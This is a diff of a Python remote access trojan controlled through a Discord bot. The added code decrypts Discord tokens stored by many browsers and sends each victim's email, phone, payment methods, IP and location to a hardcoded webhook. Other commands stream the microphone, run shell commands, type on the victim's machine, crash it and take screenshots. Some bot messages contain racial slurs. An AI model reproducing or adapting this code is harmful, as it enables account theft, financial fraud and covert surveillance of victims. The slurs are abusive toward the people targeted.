@@ -24,12 +24,18 @@ import tempfile
 import shutil
 import random
 import pygetwindow as gw
-from browser import Browsers
-from _webhook import _WebhookX
-from dhooks import Embed
+import json
+import re
+import base64
+import win32crypt
+import datetime
+from Crypto.Cipher import AES
+import httpx
+from misc import *
+import pyaudio
 from cryptography.fernet import Fernet
-from _random_string import get_random_string
-from medical_research import *
+
+
 
 key = b"KzgB8bcSmuhiXudpeJ97pGxrVJNpRUAeeKR7MK80hbQ="
 encrypted_token = b"gAAAAABnpwk0AMR2kHz2wQFHUT-eXyqfugs_Zx7mioRteBu8NDlh5NdPmWv8P7BCM_D6wqaWCRqHh9eCdCgx7k80MFoYw5EkM-nVYrpGmy1B0N6VEgApc_K8g_77bHEQnt6koKuwfHCZXsuD-nIy7HmyaKZjk_C4iy6hDy7LR8XVUZj2_p7ty_Q="
@@ -41,13 +47,28 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
-    "Discord": ROAMING + "\\Discord",
-    "Discord Canary": ROAMING + "\\discordcanary",
-    "Discord PTB": ROAMING + "\\discordptb",
-    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
-    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
-    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Amigo': LOCAL + '\\Amigo\\User Data',
+    'Torch': LOCAL + '\\Torch\\User Data',
+    'Kometa': LOCAL + '\\Kometa\\User Data',
+    'Orbitum': LOCAL + '\\Orbitum\\User Data',
+    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
+    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
+    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
 }
 baseurl = "https://discord.com/api/v9/users/@me"
 tokens = []
@@ -61,9 +82,6 @@ pyautogui.FAILSAFE = False
 SCRIPT_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/drat.py"
 CURRENT_VERSION = "1.0.0"
 UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/version.txt"
-webhook = "https://discord.com/api/webhooks/1334408432509386822/CyA9d0WeYAqJeaIUuept2SNoN2x0CO7o6gx530fHG0D6XJdLQ9vLsKQBaAeGl3Ap5g8s"
-ram_eater_active = False
-bandwidth_eater_active = False
 
 
 def check_for_updates():
@@ -142,42 +160,41 @@ def invert_mouse_loop():
         time.sleep(0.01)
 
 
-
-def getHeader(token=None, content_type="application/json"):
+def getheaders(token=None):
     headers = {
-        "Content-Type": content_type,
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
     }
+
     if token:
         headers.update({"Authorization": token})
+
     return headers
 
-def getUserData(token):
-    try:
-        response = urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token)))
-        if response.getcode() == 200:
-            return loads(response.read().decode())
-        else:
-            debug(f"Invalid token: {token}")
-            return None
-    except Exception as e:
-        debug(f"Error getting user data: {e}")
-        return None
-
-def getTokenz(path):
-    path += "\\Local Storage\\leveldb"
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
     tokens = []
-    try:
-        for file_name in os.listdir(path):
-            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-                continue
-            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}") :
-                    for token in findall(regex, line):
-                        tokens.append(token)
-    except Exception as e:
-        debug(f"Error getting tokens: {e}")
+
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
+
+        try:
+            for line in (x.strip() for x in open(f"{path}{file}", "r", errors="ignore").readlines()):
+                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                    tokens.append(values)
+        except PermissionError:
+            continue
+
     return tokens
+    
+def getkey(path):
+    with open(path + f"\\Local State", "r") as file:
+        key = json.loads(file.read())['os_crypt']['encrypted_key']
+        file.close()
+
+    return key
+
 
 def whoTheFuckAmI():
     try:
@@ -251,62 +268,137 @@ async def send_embed(email, phone, nitro, billing, ip, pc_username, pc_name, pla
 def debug(message):
     print(f"[DEBUG] {message}")
 
-@bot.event
-async def on_ready():
-    print(f"running")
-    working = []
+
+def grabToken():
     checked = []
-    already_cached_tokens = []
-    working_ids = []
-    ip = whoTheFuckAmI() 
-    pc_username = os.getenv("UserName") 
-    pc_name = os.getenv("COMPUTERNAME")
-    user_path_name = os.getenv("userprofile").split("\\")[2]
 
     for platform, path in PATHS.items():
         if not os.path.exists(path):
             continue
-        for token in getTokenz(path): 
-            if token in checked:
-                continue
-            checked.append(token)
-            uid = None
 
+        for token in gettokens(path):
+            token = token.replace("\\", "") if token.endswith("\\") else token
 
-            if not token.startswith("mfa."):
-                try:
-                    uid = b64decode(token.split(".")[0].encode()).decode()
-                except:
-                    pass
-                if not uid or uid in working_ids:
+            try:
+                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                if token in checked:
                     continue
+                checked.append(token)
+
+                res = requests.get('https://discord.com/api/v10/users/@me', headers=getheaders(token))
+                if res.status_code != 200:
+                    continue
+                res_json = res.json()
+
+                badges = ""
+                flags = res_json['flags']
+                if flags == 64 or flags == 96:
+                    badges += ":BadgeBravery: "
+                if flags == 128 or flags == 160:
+                    badges += ":BadgeBrilliance: "
+                if flags == 256 or flags == 288:
+                    badges += ":BadgeBalance: "
+
+                res = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=getheaders(token)).json()
+                friends = len([x for x in res if x['type'] == 1])
+
+                res = requests.get('https://discordapp.com/api/v6/users/@me/guilds', params={"with_counts": True}, headers=getheaders(token)).json()
+                guilds = len(res)
+                guild_infos = ""
+
+                for guild in res:
+                    if guild['permissions'] & 8 or guild['permissions'] & 32:
+                        res = requests.get(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token)).json()
+                        vanity = ""
+
+                        if res["vanity_url_code"] != None:
+                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
+
+                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
+                if guild_infos == "":
+                    guild_infos = "No guilds"
+
+                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
+                has_nitro = False
+                has_nitro = bool(len(res) > 0)
+                exp_date = None
+                if has_nitro:
+                    badges += f":BadgeSubscriber: "
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S%z").strftime('%d/%m/%Y at %H:%M:%S')
+
+                res = requests.get('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token)).json()
+                available = 0
+                print_boost = ""
+                boost = False
+                data = httpx.get("https://ipinfo.io/json").json()
+                googlemap = "https://www.google.com/maps/search/google+map++" + \
+                    data.get('loc')
+                for id in res:
+                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                        print_boost += f"ㅤ- Available now\n"
+                        available += 1
+                    else:
+                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    boost = True
+                if boost:
+                    badges += f":BadgeBoost: "
+
+                payment_methods = 0
+                type = ""
+                valid = 0
+                for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token)).json():
+                    if x['type'] == 1:
+                        type += "CreditCard "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+                    elif x['type'] == 2:
+                        type += "PayPal "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+
+                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
+                embed_user = {
+                    'embeds': [
+                        {
+                            'title': f"**New user data: {res_json['username']}**",
+                            'description': f"""
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nFriends: {friends}\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {whoTheFuckAmI()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```\n[Google Maps Location]({googlemap})""",
+                            'color': 3092790,
+                            'footer': {
+                                'text': "Made by the Supreme Leader"
+                            },
+                            'thumbnail': {
+                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
+                            }
+                        }
+                    ],
+                    "username": "The Aladeen Citadel",
+                    "avatar_url": "https://github.com/adolfhustler/Aladeen/blob/main/Flag_of_Wadiya.gif?raw=true"
+                }
+
+                requests.post('https://discord.com/api/webhooks/1338044128788877422/cmq9vdAIQuwWe-k7EyzuV6LYxr1MXyJllTB4kmt-KJUYkpxWAerln01aSi3LZVnFBClS', json=embed_user, headers=getheaders())
+            except:
+                continue
 
 
-            user_data = getUserData(token)
-            if not user_data:
-                debug(f"Invalid token or failed to get user data for token: {token}")
-                user_data = None 
+@bot.event
+async def on_ready():
+    print(f"running")
+    grabToken()
 
-            working_ids.append(uid)
-            working.append(token)
-
-
-            username = user_data["username"] + "#" + str(user_data["discriminator"]) if user_data else "N/A"
-            user_id = user_data["id"] if user_data else "N/A"
-            email = user_data.get("email") if user_data else "N/A"
-            phone = user_data.get("phone") if user_data else "N/A"
-            nitro = bool(user_data.get("premium_type")) if user_data else False
-            billing = bool(paymentMethods(token)) if user_data else False
-            hwid = hWiD()
-            await send_embed(email, phone, nitro, billing, ip, pc_username, pc_name, platform, user_path_name, hwid, token, tokens, username, user_id)
 
 
 @bot.event
 async def on_application_command_error(ctx, error: discord.DiscordException):
     if isinstance(error, commands.CommandOnCooldown):
-        await ctx.respond("This command is currently on cooldown!")
+        await ctx.send("This command is currently on cooldown!")
     if isinstance(error, commands.MissingRequiredArgument):
-        await ctx.respond("Enter all the arguments nigger")    
+        await ctx.send("Enter all the arguments nigger")    
     else:
         raise error       
         
@@ -322,14 +414,11 @@ async def execute(ctx, name, *, command: str):
             if command.startswith("cd "):
                 try:
                     os.chdir(command[3:].strip())
-                    response = f"Changed directory to: {os.getcwd()}"
+                    response = f"Changed directory to: {os.getcwd()}\n"
                 except Exception as e:
-                    response = f"Error: {e}"
-                await ctx.send(f"Output:\n```{response}```")
-                return
-
-            # Process other commands
-            process = subprocess.Popen(
+                    response = str(e) + "\n"
+            else:
+                process = subprocess.Popen(
                 command,
                 shell=True,
                 stdout=subprocess.PIPE,
@@ -339,12 +428,11 @@ async def execute(ctx, name, *, command: str):
             )
             stdout, stderr = process.communicate()
             response = stdout + stderr
-            response += f"\nCommand exited with code: {process.returncode}"
+            response += f"\nCommand exited with code: {process.returncode}\n"
 
             await ctx.send(f"Output:\n```{response}```")
         except Exception as e:
             await ctx.send(f"Error executing command: {e}")
-
 
 
 @bot.command(name='webcam')
@@ -415,8 +503,7 @@ async def screenshot(ctx, inputid):
             all_screens=True,
             xdisplay=None
         )
-        randomstring = get_random_string(8)
-        fname = f'screenshot_{randomstring}.png'
+        fname = f'screenshot_{name}.png'
         image.save(fname)
         await ctx.send(file=discord.File(fname))
         await ctx.send(f'Screenshot `{fname}` from process {name} was sent.')
@@ -695,67 +782,14 @@ async def reverse_keys(ctx, user):
             await ctx.send("Keyboard input **restored**.")
             keyboard.unhook_all()
 
-PUL = ctypes.POINTER(ctypes.c_ulong)
-
-class KeyBdInput(ctypes.Structure):
-    _fields_ = [("wVk", ctypes.c_ushort),
-                ("wScan", ctypes.c_ushort),
-                ("dwFlags", ctypes.c_ulong),
-                ("time", ctypes.c_ulong),
-                ("dwExtraInfo", PUL)]
-
-class Input_I(ctypes.Union):
-    _fields_ = [("ki", KeyBdInput)]
-
-class Input(ctypes.Structure):
-    _fields_ = [("type", ctypes.c_ulong),
-                ("ii", Input_I)]
-
-SendInput = ctypes.windll.user32.SendInput
-
-def press_key(hexKeyCode):
-    """Press a key using low-level Windows API"""
-    extra = ctypes.c_ulong(0)
-    ii_ = Input_I()
-    ii_.ki = KeyBdInput(hexKeyCode, 0, 0, 0, ctypes.pointer(extra))
-    x = Input(ctypes.c_ulong(1), ii_)
-    SendInput(1, ctypes.byref(x), ctypes.sizeof(x))
-
-def release_key(hexKeyCode):
-    """Release a key using low-level Windows API"""
-    extra = ctypes.c_ulong(0)
-    ii_ = Input_I()
-    ii_.ki = KeyBdInput(hexKeyCode, 0, 2, 0, ctypes.pointer(extra))
-    x = Input(ctypes.c_ulong(1), ii_)
-    SendInput(1, ctypes.byref(x), ctypes.sizeof(x))
-
-def type_text_realistically(text):
-    """Types text with a random delay to mimic human input"""
-    VK_CODE = {
-        'a': 0x1E, 'b': 0x30, 'c': 0x2E, 'd': 0x20, 'e': 0x12, 'f': 0x21, 'g': 0x22,
-        'h': 0x23, 'i': 0x17, 'j': 0x24, 'k': 0x25, 'l': 0x26, 'm': 0x32, 'n': 0x31,
-        'o': 0x18, 'p': 0x19, 'q': 0x10, 'r': 0x13, 's': 0x1F, 't': 0x14, 'u': 0x16,
-        'v': 0x2F, 'w': 0x11, 'x': 0x2D, 'y': 0x15, 'z': 0x2C, ' ': 0x39
-    }
-    
-    for char in text.lower():
-        if char in VK_CODE:
-            key = VK_CODE[char]
-            press_key(key)
-            time.sleep(random.uniform(0.05, 0.15))
-            release_key(key)
-            time.sleep(random.uniform(0.05, 0.15))
-
-    time.sleep(0.1)
-    press_key(0x1C)
-    release_key(0x1C)
-
 @bot.command(name="type")
 async def type_text(ctx, user, *, text):
     if user == name:
         await ctx.send(f'Typing: `{text}` on victim\'s PC! ⌨️')
 
-        type_text_realistically(text)
+        for char in text:
+            keyboard.write(char, delay=0.01)
+        keyboard.press_and_release("enter")
 
 
 @bot.command(name="swapmouse")
@@ -842,18 +876,6 @@ async def list_browser_tabs(ctx, user):
         else:
          await ctx.send("🚫 **No browser tabs found!**")
 
-@bot.command(name="grabdiscord")
-async def grabtoken(ctx, user):
-    if user == name:
-        try:
-            accounts = grab_discord.initialize(False)
-            print(accounts)
-            for account in accounts:
-                    print(account)
-                    reaction_msg = await ctx.channel.send(embed=account); await reaction_msg.add_reaction('📌')
-        except Exception as e:
-            pass             
-
 
 @bot.command(name="bsod")
 async def bsod(ctx, user):
@@ -877,8 +899,59 @@ async def bsod(ctx, user):
             )
         except Exception as e:
             print(e)
+
+
+
+@bot.command(name="grabdiscord")
+async def grabtokenz(ctx, user):
+    if user == name:
+        try:
+            await ctx.send("Grabbing nigga's discord token...")
+            grabToken()
+        finally:
+            await ctx.send("Done. Check the tokens channel.")    
+
+
+@bot.command(name="mic")
+async def recordmic(ctx, user):
+    if user == name:
+        try:
+            channel = bot.get_channel(1335115941444587615)
+            if channel:
+                vc = await channel.connect(self_deaf=True)
+            else:
+                await ctx.send("Channel not found.")
+
+            vc.play(PyAudioPCM())
+            await ctx.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
+
+        except Exception:
+            await ctx.send("There was an error.")
+
+
+@bot.command(name="leave")
+async def leave(ctx):
+        vc = discord.utils.get(bot.voice_clients, guild=ctx.guild)
     
+        if vc:
+            await vc.disconnect()
+            await ctx.send("left the vc")
+        else:
+            await ctx.send("im not ina vc dumbass")
+
+
+bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
+opuslib_path = os.path.abspath(os.path.join(bundle_dir, './crack.dll'))
+discord.opus.load_opus(opuslib_path)
+
+class PyAudioPCM(discord.AudioSource):
+    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
+        p = pyaudio.PyAudio()
+        self.chunks = chunk
+        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
+    def read(self) -> bytes:
+        return self.input_stream.read(self.chunks)
+
 
 def run_rat():
-    print(DISCORD_BOT_TOKEN)
     bot.run(DISCORD_BOT_TOKEN)                    
